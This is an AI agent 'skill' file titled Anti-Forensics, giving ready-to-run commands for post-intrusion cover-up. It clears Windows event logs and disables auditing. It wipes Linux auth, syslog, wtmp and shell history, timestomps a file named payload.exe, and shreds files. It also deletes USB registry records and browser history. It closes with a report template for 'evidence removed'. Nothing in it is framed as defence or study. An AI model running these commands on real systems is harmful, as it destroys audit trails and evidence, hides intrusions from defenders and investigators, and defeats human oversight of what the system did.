---
name: anti-forensics
description: Anti-forensics techniques, log evasion, timestomping, and evidence destruction.
---

# Anti-Forensics Skill

## Log Evasion

### Windows
```bash
# Clear event logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

# Disable logging
auditpol /set /subcategory:"Logon" /success:disable /failure:disable

# Clear PowerShell history
Remove-Item (Get-PSReadLineOption).HistorySavePath
```

### Linux
```bash
# Clear auth logs
echo "" > /var/log/auth.log
echo "" > /var/log/secure

# Clear syslog
echo "" > /var/log/syslog
echo "" > /var/log/messages

# Clear bash history
history -c
rm -f ~/.bash_history
export HISTSIZE=0

# Clear utmp/wtmp
echo "" > /var/log/wtmp
echo "" > /var/log/btmp
```

## Timestomping

```bash
# Linux
touch -r /bin/ls payload.exe
touch -t 202201011200 payload.exe

# Windows (Python)
python -c "import os; os.utime('payload.exe', (1609459200, 1609459200))"

# PowerShell
(Get-Item payload.exe).CreationTime = "01/01/2022 12:00:00"
(Get-Item payload.exe).LastWriteTime = "01/01/2022 12:00:00"
```

## File Destruction

```bash
# Secure delete
shred -vfz -n 5 sensitive_file.txt

# Overwrite and delete
dd if=/dev/zero of=sensitive_file.txt bs=1M count=10
rm -f sensitive_file.txt

# Windows
sdelete -p 5 sensitive_file.txt
cipher /w:C:\temp
```

## Evidence Destruction

```bash
# Clear USB artifacts
# Windows
reg delete "HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR" /f

# Linux
echo "" > /var/log/usb.log

# Clear browser history
rm -rf ~/.mozilla/firefox/*/places.sqlite
rm -rf ~/.config/google-chrome/Default/History

# Clear DNS cache
# Windows
ipconfig /flushdns

# Linux
systemd-resolve --flush-caches
```

## Memory Anti-Forensics

```bash
# Clear pagefile
# Windows
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v ClearPageFileAtShutdown /t REG_DWORD /d 1 /f

# Unload DLLs
# Use process injection to unload malicious DLLs

# Clear environment variables
unset HISTFILE
unset HISTSIZE
```

## Output Format
```
[ANTI-FORENSICS] Technique
[TARGET] Log/Artifact/File
[METHOD] Action performed
[PROOF] Evidence removed
```
